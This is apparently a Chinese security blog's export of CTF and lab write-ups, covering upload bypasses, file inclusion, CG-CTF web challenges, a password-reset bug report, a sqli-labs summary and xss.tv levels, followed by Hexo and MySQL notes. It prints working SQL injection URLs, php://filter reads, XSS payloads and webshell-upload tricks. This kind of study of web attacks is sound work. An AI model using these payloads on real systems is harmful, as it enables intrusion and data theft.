//意思是将1.jpg以二进制与1.php合并成13.jpg那么2.jpg就是图片木马了。 生成出来这时候利用文件包含漏洞 包含该文件即可 jpg gif是一个道理的。 Pass-14与Pass-13是一样的突破方法 唯一不同的是getimagesize获取文件类型 我们直接上传的本来就是图片类型。所以姿势是一样的。 Pass-15多了个php_exif模块来判断文件类型 突破方法与Pass-13一致 Pass-16突破方法与Pass-13一致 本来以为还是和前面方法一致但是文件包含的时候却不行 查看源代码发现考察的是二次渲染 姿势盲区了 故查了下资料(百度太垃圾什么也没有用google哦) 普通的图片马上传以后 经过imagecreatefromjpeg 函数二次渲染，图片尾部的php一句话被删除 看了一篇类似的文章 可以通过对比上传前后的图片内容 找到上传前没有改变的部分将一句话写道没有改变的这部分尝试一下 由于我这里没有16进制编辑器 就不尝试了 不过应该没有问题。。 google看到的copy过来 对渲染了解的少 需要多了解了解。 将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 Pass-17考察条件竞争 如果你要问条件竞争是什么，可以看一下这篇文章 CTF中的条件竞争漏洞 关于条件竞争不怎么明白 Google了半天发现无法突破本关 于是厚着脸皮让国光哥来远程。。。涨姿势了 总结出来一句话利用burp批量发包 让程序措手不及 上传1.php抓包 线程设置高一点 开始不断发包 在我和国光哥的10分钟不断刷新下果然成功了。。。 产生原因将文件上传，然后判断后缀是否是图片，如果不是图片文件则将其删除。 Pass-18条件竞争 利用Pass-17方法一样可以利用 但是我这边一直没有成功呢。。。姿势问题 Pass-19到了这里发现越来越简单 move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过 感觉这题和12题有点类似]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[西湖论剑web 3题 解析]]></title>
    <url>%2F2019%2F04%2F11%2F%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-3%E9%A2%98-%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了 故来做一下web题目 题目质量较高 babyt3 打开题目连接 看到一个类似博客界面 都不是重点 重点是看到了 include $_GET[&#39;file&#39;] 看到这突然想到题目考查的应该是文件包含相关知识 故试一下 1http://61.164.47.198:10000/?file=php://filter/convert.base64-encode/resource=index.php 两端base64加密的内容 第一段为index.php加密后的内容 base解密后为 12345678910111213&lt;?php$a = @$_GET['file'];if (!$a) &#123; $a = './templates/index.html';&#125;echo 'include $_GET[\'file\']';if (strpos('flag',$a)!==false) &#123; die('nonono');&#125;include $a;?&gt;&lt;!--hint: ZGlyLnBocA== --&gt; 貌似用处不大 不过第二段的&lt;!--hint: ZGlyLnBocA== --&gt; 解密后为dir.php 访问一下 1http://61.164.47.198:10000/dir.php 接下来利用文件包含 包含dir.php这个文件。 1http://61.164.47.198:10000/?file=php://filter/convert.base64-encode/resource=dir.php base64解密后得到 dir.php源码 123456&lt;?php$a = @$_GET['dir']; //dir通过接收数据并复制给变量aif(!$a)&#123; $a = '/tmp'; //默认a的路径&#125;var_dump(scandir($a)); //列出指定路径中的文件和目录 也就是说dir.php可以读取你输入的目录并展示目录下的所有文件 自己想的是 如果我输入某目录 就会展示出目录下所有文件 文件夹名 之后我是不是可以利用文件包含 读取任意文件的内容呢？？ 经过测试 发现ffffflag_is_Her4文件 估计flag在文件内 利用文件包含读取内容 果然发现flag 1flag&#123;8dc25fd21c52958f777ce92409e2802a&#125;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
        <tag>目录遍历</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮CG-CTF]]></title>
    <url>%2F2019%2F04%2F01%2F%E5%8D%97%E9%82%AECG-CTF%2F</url>
    <content type="text"><![CDATA[第一次写ctf的wp 有些表达的可能不是很清楚 题目感觉质量很高 也很有趣哈 只写了部分web题目 pwn crypto不涉及 不要问我为什么 厂长是我表哥 签到题签到题 右键查看源代码 1nctf&#123;flag_admiaanaaaaaaaaaaa&#125; md5 collision 源码中可以看出 变量a经过get方式传递 ,a的值不等于QNKCDZO 但a的只经过md5加密后等于 QNKCDZO加密后的值 看似很矛盾 发现 QNKCDZO加密后的值是0e830400451993494058024219903391 是0e开头的，PHP 把它当作科学计数法，0 的无论多少次方都是零 所以我们找到md5加密后的值是0e开头的即可 这里我用s878926199a 1nctf&#123;md5_collision_is_easy&#125; 签到题2 复制了口令点击开门发现提交的时候少了一个n 查看源代码发现 最大长度为10 1&lt;input type="password" value="" name="text1" maxlength="10"&gt; 限制了长度改成11即可 1nctf&#123;follow_me_to_exploit&#125; 这题不是web 放了一张图。先保存到本地 1nctf&#123;photo_can_also_hid3_msg&#125; 层层递进 这题本来是没有思路的 请教了下国光哥 1nctf&#123;this_is_a_fl4g&#125; AAencode打开以后一大堆乱码。。以txt文件保存到本地 之后把保存在txt的文件内容粘贴到审查元素下的Console 1nctf&#123;javascript_aaencode&#125; 单身二十年点一下超链接 抓包一下看看 1nctf&#123;yougotit_script_now&#125; php decode 给出代码 大体意思是，声明一个函数 把接收到的ZzvSWE变量的值 进行base64解密后 再次进行gzinflate加密 之后遍历每个字符 的ascii的值 -1最后在转化为字符串。 mac下安装了集成环境 把代码copy一下放到网站目录 打开后发现什么都不显示 分析一下代码倒数第二行的eval eval是把任何字符串当做php代码来执行 而php代码是不能在前台显示出来的 (自己是这样理解 不知道对不对) eval换成echo即可 文件包含这题用到php伪协议的知识 自己对这块不怎么了解 有时间要总结一下php伪协议的知识。 1http://4.chinalover.sinaapp.com/web7/index.php?file=show.php payload1http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php php代码是不能再前台显示的 所以需要进行base64加密，显示到前台以后，base解密即可 1nctf&#123;edulcni_elif_lacol_si_siht&#125; 单身一百年也没有用还是抓包一下看看 1nctf&#123;this_is_302_redirect&#125; Download~!题目挂了 COOKIETIP: 0==not 抓包看一下 根据提示 0==not 我们修改login=1 1nctf&#123;cookie_is_different_from_session&#125; MYSQL 点开题目连接 根据Do you know robots.txt？ 这题最开始有点疑问 感觉是sql注入 后面百度了一下才知道思路不对 考的是intval()的用法 intval把变量转化为整数 id=1024.01就能绕过爆出flag nctf{query_in_mysql} GBK Injection进入解题连接后发现本题考查sql注入 输入&#39;看一下 果然被转义了。。。这时候看到题目名字gbk 貌似明白了 宽字节注入 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df'union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 发现存在ctf,ctf2,ctf3,ctf4,news表 ctf感觉有戏 先看一下ctf表下的字段名 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df'union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466--+ 发现user,pw字段 接下来查看数据 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df'union select 1,group_concat(user,pw) from ctf--+ 果然 美滋滋的跑去提交 发现flag不对？？？？？？？？？？ 之后我每个表都试了一下 发现ctf4下也有一个falg 1flag&#123;this_is_sqli_flag&#125; 格式感觉就不对 姿势盲区了百度了一下 发现前辈们也是在ctf4下发现的flag是 1nctf&#123;gbk_3sqli&#125; 不知道怎么回事 不自信的我复制了前辈的payload爆出的flag也是flag{this_is_sqli_flag}看来真的是题目本身的问题了。。 /x00 又是一道看似很矛盾的题目 这里用数组直接可以绕过 1http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=1 爆出flagnctf{use_00_to_jieduan} 本题提示说有多种解题方法 题目名字让我想到了应该可以00截断 ereg函数存在%00截断漏洞，当遇到%00(NULL)时，函数就截止了 strpos函数 查找#biubiubiu在nctf变量接收的值中第一次出现的位置 1http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu bypass again这道题呢和md5 collision考查的是一个点弱类型 get方式接受 a b两个参数 使得a不等于b 但md5加密后a的值必须等于md5加密后b的值 这里我直接用QNKCDZO s878926199a不只这两个很多加密后的值都是0e开头的详情百度一下 1http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=s878926199a nctf{php_is_so_cool} 变量覆盖 点一下/source.php 出现index.php的源码 extract()函数的作用：从数组中将变量导入到当前的符号表 由于此函数存在变量覆盖漏洞 给pass赋值就覆盖了原值所以post下直接提交 两个变量的值相等就会爆出flag nctf{bian_liang_fu_gai!} php是世界上最好的语言貌似也挂了 伪装者 抓包修改X-Forwarded-For: 127.0.0.1 貌似没用 偷偷看了国光哥的wp 姿势没问题 题目出现了点问题 网上flag nctf{happy_http_headers} Header题目又挂了。。 上传绕过 一次实战很多次ctf遇到类似突破上传的方法 以前单独总结过这种方法写的很详细 常见的突破上传姿势 nctf{welcome_to_hacks_world} SQL注入1 打开解题连接出现此页面 点击Source查看源码 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;Secure Web Login&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]=="admin") &#123; echo "&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"; &#125; if($query[user] != "admin") &#123; echo("&lt;p&gt;You are not admin!&lt;/p&gt;"); &#125;&#125;echo $query[user];?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value="Username"&gt;&lt;input type=password name=pass value="Password"&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href="index.phps"&gt;Source&lt;/a&gt;&lt;/html&gt; 解题的关键核心语句 1$sql="select user from ctf where (user='".$user."') and (pw='".$pass."')"; 123if($query[user]=="admin") &#123; echo "&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"; &#125; 用户名为admin即可拿到flag所以应该注释掉后面的密码 sql语句源码里都有了构造一下 admin&#39;)# 这里做题的时候忽略了php的基础一直这样子写admin&quot;&#39;)#后面才反应过来双引号是接受变量用的。。。 nctf{ni_ye_hui_sql?} pass check题目代码 12345678910111213$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo "flag:nctf&#123;*&#125;";&#125;else&#123;echo "the pass is wrong!";&#125;&#125;else&#123;echo "please input pass!";&#125;?&gt; post接收pass参数用strcmp函数与pass1做比较 php的strcmp函数不能处理数组所以 nctf{strcmp_is_n0t_3afe} 密码重置 打开解题连接后观察url user1=Y3RmdXNlcg==猜测base64加密 解密后果然是ctfuser 根据题目提示：重置管理员账号：admin 的密码 admin经过base64加密后YWRtaW4= url替换成user1=YWRtaW4= 账号替换成admin 发现替换不了账号 审查元素看一下 readonly 属性规定输入字段为只读。是不可以修改的 删除了就好 nctf{reset_password_often_have_vuln}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记第一次漏洞挖掘]]></title>
    <url>%2F2019%2F04%2F01%2F%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%2F</url>
    <content type="text"><![CDATA[第一次挖src 以前我很不自信 对于专属src想的都是 大厂的漏洞能有几个 就算有，好挖的也都被挖没了 不好挖的更是轮不到我这菜鸡。。 第一次挖src前几天学校有新生来考试放假了几天。闲的无聊随便点了一个专属src就发现了一个密码重置漏洞 自己都没想到好激动！！！ 任意密码重置属于高危漏洞吧 第一次挖到高危也算是开门红哈 记录一下过程 挖洞过程找回密码处 填写注册时候的手机号 确定后到达第二步验证身份 发现有三个参数number mobileNum key 这里187是我的手机号 发送验证码之后进入第三部密码重置 第三部发现少了 number参数 只有两个 参数 到达第三步密码重置的时候我把mobileNum key换成其他132…..手机号和对应的key(第一步填写账号填写对方手机号到达第二步就会得到对应手机号的key) 之后填写新密码发现果然改了132…..的密码 因此确定任意密码重置漏洞。 知道对方手机号就可以重置对方密码。 简要描述简单说是输入手机号和验证码进行重置密码的时候，仅对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做验证。 修复方案修复方案:验证码与手机号匹配做验证。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>src</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于注入天书的mysql注入总结]]></title>
    <url>%2F2019%2F03%2F10%2F%E5%9F%BA%E4%BA%8E%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6%E7%9A%84mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[本篇基于注入天书的例子进行总结 前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。 MySql系统函数注入前我们先了解一下mysql常用的系统函数 这些函数往往起到 信息收集的目的 12345ersion() MySQL版本user() 数据库用户名database() 数据库名@@datadir 数据库路径@@version_compile_os 操作系统版本 基本的联合注入information_schema这张数据表保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema表里面。 这里拿sqli第一关来进行实验 1http://localhost/sqli-labs/Less-1/?id=1' 我们看一下源码里的查询语句 前面单引号我们应该闭合 后面我们可以用–+来注释1http://localhost/sqli-labs/Less-1/?id=1%27order%20by%203--+ 接下里思路就比较常规了 查询所有数据库1http://localhost/sqli-labs/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+ 查询当前数据库1http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),3--+ 查询数据库下的表名1http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22security%22--+ 爆user表下的列1http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=%22security%22%20and%20table_name=%22users%22--+ 爆数据1http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(id,username,password),3%20from%20users--+ Less 1-4都是可以用类似的payload来注出数据的 唯一不同的是 less2对没有对参数进行处理payload 与 less1 中一直，只需要将 less1 中的 ‘ 去掉即可。 less3对参数进行了’ ‘ （ ）的包装 只需要将 less1 中的 ‘ 添加） 即 ’) 即可 less4对参数进行了” “（ ）的包装 只需要将 less1 中的 ‘ 改为 “) 即可 盲注盲注是在sql语句执行后 数据不能返回到前端页面 不能回显 此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。 注入天书上讲盲注也分为三类 基于布尔的sql盲注 基于时间的sql盲注 基于报错的sql盲注 截取字符串常用函数1count() 计算总数 1mid(coulumn_name,start,length) ​ mid(database(),1,1)&gt;’a’,查看数据库名第一位， ​ mid(database(),2,1)查看数据库名第二位，依次查看各位字符。 1Substr(a,b,c)参数同mid函数一样 ​ 从 b 位置开始，截取字符串 a 的 c 长度。 ​ substr(database()1,1) 1Left()得到字符串左部指定个数的字符 ​ Left ( a, b ) 从左侧截取a的前b位。 ​ left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库 名前二位 12ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ //substr()函数，ascii()函数 截取当前数据库下所有表名的 第一个表的 名字的第一位是否为ascii编码101(ascii编码101为字母e 也就是第一位是否为e) 布尔盲注sqli第五关来做实例 与联合查询有所不同联合查询上来就可以database爆出数据库名 盲注的话我们应该先猜数据库长度 数据库的长度1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20length(database())=8--+ 上面长度为8时界面Ture说明数据库长度为8 有了长度以后才应该去猜数据库名 数据库名1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr(database(),1,1))=115--+ 判断数据库名的第一位是否等于s(这里把s进行了ascii码转换可以更快且更方便的猜出数据) 以此类推来猜测数据库名第二位 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr(database(),2,1))=101--+ 感觉太磨叽 额。。。依次类推猜出数据库名为security 表名获取表名之前 首先应该知道数据库下表的数量 方便后面来猜表名 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20count(table_name)from%20information_schema.tables%20where%20table_schema=database())=4--+ 当前数据库下的表的个数有4个 步骤应该很清晰 知道了有4个表接下来 我们来猜一下每个表的长度 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(table_name)from%20information_schema.tables%20where%20table_schema=database()limit%200,1)=6--+ 等于6时返回正常可知第一个表长度为6 这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那要获取第二个是不是就是 limit 1,1！ 所以获取第二个表的长度为 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(table_name)from%20information_schema.tables%20where%20table_schema=database()limit%201,1)=8--+ 第三个，四个类似 至此可以获取四个表每个表的长度 接下来猜第一个表名的第一个字符 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%200,1),1,1))=101--+ 第一个表第二个字符 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%200,1),2,1))=109--+ 上面提到了limit 所以猜测第二个表的第一个字符的话 limit 1,1 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%201,1),1,1))=114--+ 后面依次类推 到这里我们就获取到了security数据库下 也就是当前数据库下的所有表名 列名来看users表下的列 首先还是和表类似猜测users表下列的个数 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20count(column_name)from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%22users%22)=3--+ 等于3返回正常判断出有三列 套路是一样的还是判断 第一个列的长度 1http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(column_name)from%20information_schema.columns where table_schema=database() and table_name="users" limit%200,1)=2--+ 第二个三个同上面表明一样 limit 1,1 limit 2,1即可 第一个列的第一个字符 1http://127.0.0.1/sqli-labs/less-5/?id=1'and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name="users"limit 0,1),1,1))=105--+ 后面就不多写了 都是一样的东西（懒得写） 后可得 users表下的列 id username password 数据得到列首先判断users表中有多少条记录 1http://127.0.0.1/sqli-labs/less-5/?id=1'and (select count(*) from users)=13--+ 判断出users表里13条数据信息 下图 是users表下的内容 对比笔记看起来更直观吧 紧着着判断 13条数据第一条数据的长度 1http://127.0.0.1/sqli-labs/less-5/?id=1'and (select length(username) from users limit 0,1)=4 --+ 1http://127.0.0.1/sqli-labs/less-5/?id=1'and (select length(password) from users limit 0,1)=4 --+ 后面还是依次类推 这样就获取到了13条数据的长度 累死了。。。。 最后就是猜数据里的内容了 1http://127.0.0.1/sqli-labs/less-5/?id=1'and ascii(substr((select username from users limit 0,1),1,1))=68 --+ 第一条username列下的数据 不说了还是重复造轮子 到这里就能猜出了 13条数据的所有内容喽。。。 延时注入延时注入 和布尔注入感觉差别并不大 但是为什么还要学 延时注入 这是因为某些注入点 你输入什么它返回的都是一样的东西 和程序员写的源码有关 这时候布尔注入算是废了 转用延时注入 语法上差别是不大的 if(条件判断,True,False) Sleep(5)表示延时五秒 当前数据库长度 1http://127.0.0.1/sqli-labs/less-5/?id=1'and sleep(if(length(database())=8,0,5))--+ 这里没有延时 可以确定当前数据库长度为8 数据库的第一位 1http://127.0.0.1/sqli-labs/less-5/?id=1'and sleep(if(ascii(substr(database(),1,1))=115,0,5))--+ 感觉和布尔的区别 就是加上了sleep if 后面的话就不重复造轮子了 同理！！！ 过滤注入关键词过滤了and or绕过思路 大小写变形 OR,Or oR 编码 ，hex ,url 添加注释/ or / 利用符号and=&amp;&amp; or=|| 注入天书 25题 虽过滤了 or 可用此方法绕过 1http://localhost/sqli-labs/less-25/?id=1' ||or extractvalue(1,concat(0x7e,database()))--+ 过滤了空格mysql空白字符 1%20 %09 %0a %0b %0c %0d %a0 /**/ tab %a0 和%0b比较常用 %0b相当于tab键 书上写到 在win下测试是不能解析%a0的 我在mac下测试把%a0解析成了问号？？？%0b也无法解析 其他的还没有去试过 猜测部分字符只能在linux环境下 这里参考以前一个ctf 滴！晨跑打卡 过滤union select 首先还是尝试大小写绕过 尝试uniunionon中间过滤后再次拼接成union 一般情况应该不会二次过滤 宽字节注入宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入 例如php编码为 utf-8 而mysql的编码为gbk这就导致了宽字节注入了 mysql在使用gbk编码的时候，会认为两个字符为一个汉字 例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围） 一般情况下程序员会把接收到的预定义字符 默认前面添加一个\ 123单引号（'）= （\'）双引号（"） = （\"）反斜杠（\） = （\\） 这里注入天书第32题举例前端输入%df%27时 经过addslashes函数转义变成了%df%5c%27%5c 是反斜杠 mysql服务器对查询语句进行编码两个字符转换成一个汉字 %df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss tv wp]]></title>
    <url>%2F2019%2F03%2F01%2Fxss%20tv%20wp%2F</url>
    <content type="text"><![CDATA[xss题目 一共20题 难度也在递增吧 写一部分自己的解题过程 后面题目厉害了 慢慢更新(太菜不会做) 题目 payload不唯一呦 level1没有任何过滤 Payload1&lt;script&gt;alert("xss")&lt;/script&gt; level2记得以前xss这里曾请教过国光哥一些姿势 先输入 1&lt;img src=1 onerror=alert("xss")&gt; 查看源码发现 value的值里使用了双引号 所以想到闭合前面的双引号。 Payload1"&gt;&lt;img src=1 onerror=alert("xss")&gt; 涉及基础img为图片标签 src应该填写图片地址 如果图片地址不存在 就会触发onerror事件弹出xss level3试探性输入 1&lt;img src=1 onerror=alert("xss")&gt; 查看源代码发现两端括号被实体化了 换个姿势 1onclick=alert(1) 右键源代码 发现本身并没有被过滤 但是value里面使用了单引号 闭合就好 Payload1‘&gt;onclick='alert(1) level4与level3类似 这题目value里面使用了双引号 闭合双引号就ok Payload1"onclick="alert(1)" level5参考前面 直接输入payload 1onclick=alert(1) 发现被过滤 大小写无法绕过 换个姿势 1&lt;a href=javascript:alert("xss")&gt; 这时候查看源代码发现本身并没有过滤 都是一个套路闭合一下双引号即可 Payload1"&gt;&lt;a href=javascript:alert("xss")&gt; level6这题目前有点坑 与上题相似 单过滤了href src等属性 这里考虑到可以用大小写绕过 Payload1"&gt;&lt;img SRC=1 ONERROR=alert(1)&gt; level7随便写个payload 1onclick=alert(1) 查看源代码发现 value有双引号 首先考虑到闭合 其次on被过滤为空 估计不会进行二次过滤 Payload1"onclick="alert(1) level8添加超链接到页面 本身在a标签里面所以我们payload如下 1Javascript:alert(1) 发现并没弹窗 查看源代码发现javascript被过滤 试了很多都被过滤 想到html有字解码机制 试一下将过滤关键字实体化 字符实体转换 Payload1java&amp;#115;cript:alert(1) level9这里始终不知道是怎么回事 看了xz的wp 得知这题自动检测url 如果发现没有带 http:// 则会显示不合法 还发现了过滤了双引号 还是利用html自解码机制将关键字实例化即可绕过 Payload1java&amp;#115;cript:alert(&amp;#34;http://&amp;#34;) level10这题刚打开是懵逼的 然后又请教了国光哥 右键查看源文件 发现了三个隐藏参数 经过一个个试。 发现t_sort参数是控的 由于type=&quot;hidden&quot;是隐藏的 on事件无效 所以应破坏掉type的hidden 之后利用 onclick 弹窗 Payload1keyword=1&amp;t_sort=233%22%20onclick=alert(233)%20type=%22%22 XSS常用语句及编码绕过常用的测试语句1234&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src = 1 onerror = alert(1)&gt;&lt;svg onload = alert(1)&gt;&lt;a href = javascript:alert(1)&gt; 常见的xss绕过编码js编码 html实体编码 url编码]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo搭建静态博客]]></title>
    <url>%2F2019%2F02%2F19%2FHexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[最新折腾了一下黑苹果 刚刚把博客迁移过来 所以才想起写这篇文章 Hexo+GitHub搭建静态博客 准备工作Node.js下载链接：https://nodejs.org/en/ Git下载链接：https://git-scm.com/download/win 安装好Node.js与Git 接下来安装Hexo 1npm install -g hexo-cli 安装完成以后 git —version,hexo-v查看安装版本 本地建站我们首先在本地搭建起Blog 等本地都配置完成直接放到GitHub就ok了 博客框架初始化博客框架 123hexo init &lt;folder&gt;（博客文件夹名称）cd &lt;folder&gt; // 进入博客文件夹目录npm install 这时候博客应该会出现如下文件 _config.yml 是整个站点的配置文件 不要乱改 写文章进行测试hexo new 文章名 记得在博客目录下 新建文章 可以看到新建了.md文件在 source/_posts/ 下 记住所有生成的文章都在此目录下 编辑.md 我用的是typora感觉比较好用 百度下载即可 生成静态文件12hexo generate简写 hexo g 就好 启动服务器接下来我们访问以下博客 先要启动一下hexo服务器 12hexo server简写 hexo s 启动以后我们本地访问以下 默认访问 http://localhost:4000 出现类似界面说明本地测试成功没有任何问题 更换主题在博客目录下打开终端 1git clone https://github.com/iissnan/hexo-theme-next themes/next 下载完成以后 打开博客目录下的_config.yml 找到theme 将theme的值改为next 之后输入调试命令 1hexo server --debug 在访问以下http://localhost:4000应该就已经更换主题了哦 感觉排版并不是很舒服 需要改一下 找到主题配置文件 主题配置文件在博客目录 下的 themes/next/_config.yml 这里不要搞混 这个是主题配置文件 搜索 scheme 关键字。 前面去掉#号即为启用 我们启用pisces的样式 这之后样式看起来和我博客类似了 主题就先说到这 添加分类 标签 友联 界面语言等 自己Goolge吧 也可以参考 http://theme-next.iissnan.com/getting-started.html#avatar-setting 部署到GitHub注册GitHub账号这里自己注册一个账号就好了 建立新的存储库根据GitHub用户名建立的存储库 如我的用户名scholar10所以存储库的名为scholar10.github.io 设置本地GitHub填写 git邮箱 用户名 12git config --global user.name "user_name"git config --global user.email "your_email_addr" 第一个填你github的用户名 第二天填写 注册github的邮箱 本地创建SSH1ssh-keygen -t rsa -C "1773256697@qq.com" 填自己注册github的邮箱地址就好 一路回车就好 生成的SSH添加到GitHub创建完成以后打开用户的根目录 一般在C:\Users\username(你的用户名) 应该会有.ssh文件夹 这时候找到.ssh文件里面的ssh.pub(公钥) 将里面的内容全部复制到 点击 new ssh key 会出现 title框和key框 把 ssh.pub内容全部复制到 key框 title 随意写一个名字就好 验证SSH是否设置成功 1ssh -T git@github.com 首次提示不能连接输入yes即可 接下来打开 博客目录下的_config.yml 1234deploy:type: gitrepo: https://github.com/username/scholar10.github.io.gitbranch: master 类型配置为git 仓库地址为 建立的github仓库地址(scholar10替换成自己的)分支为master也就是主分支 然后执行部署命令 1hexo deploy 简写 hexo g -d //生成静态文件后提交到github上 执行完成后 别人就可以通过 http://scholar10.github.io 访问你的博客了]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>静态博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySql笔记]]></title>
    <url>%2F2019%2F02%2F12%2FMySql%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[又很久没有写博客了 这篇笔记是边学边记的 当时比较仓促 所以有的地方可能会比较乱 但是大概的方法写的还是比较清楚了 等有时间回头再好好整理一下这篇文章。 库操作show darabases; 查询数据库 create database 数据库名; 创建数据库 show create database 数据库名; 查询数据库创建语句 修改数据库 ​ 说明：不能修改数据库名称，只能修改字符集和校对集 ​ 语句：alter database 数据库名 charset=新字符集 collate=新的校对集 ​ 注意：字符集和校对集是可以分开修改的，但是建议必须一起修改 ​ 查看校对集：show collation; 查看字符集：show charset; drop database 数据库名; 删除数据库 use 数据库名；选择数据库 表操作创建表 Create table 表名( ​ 字段名称1 字段属性（类型） 字段选项, ​ 字段名称2 字段类型 字段选项, …………………….. )表选项; 表选项：表字符集和数据引擎 字符集：charset=utf8; 数据引擎：默认innodb，语法：engine=引擎 这里的话可能会比较难理解 有一段比较官方的解释 存储引擎也叫“表类型”，是指一个表中的数据以何种方式存放在文件或内存中。不同的存储引擎（表类型）提供不同的性能特性和可用功能。没有一种各方面都又具有最佳性能又具有各种功能的存储引擎。我们要做的是要根据数据的具体使用情形（需求）来选择合适的存储引擎，有的要读取速度快，有的要写入速度快，有的要具有高安全可靠性，有的要海量存储，等等。常用的存储引擎是innoDB（默认）和Myisam。 字段类型：当前字段中存储数据类型必须是一开始指定好。 一开始制定了int 数据就不能存储float 字段选项：设置当前字段的一些选项-是否可以为空，是否是主键，是否是唯一键，是否加备注等。 Null|not null：是否可以为空 Default：是否有默认值 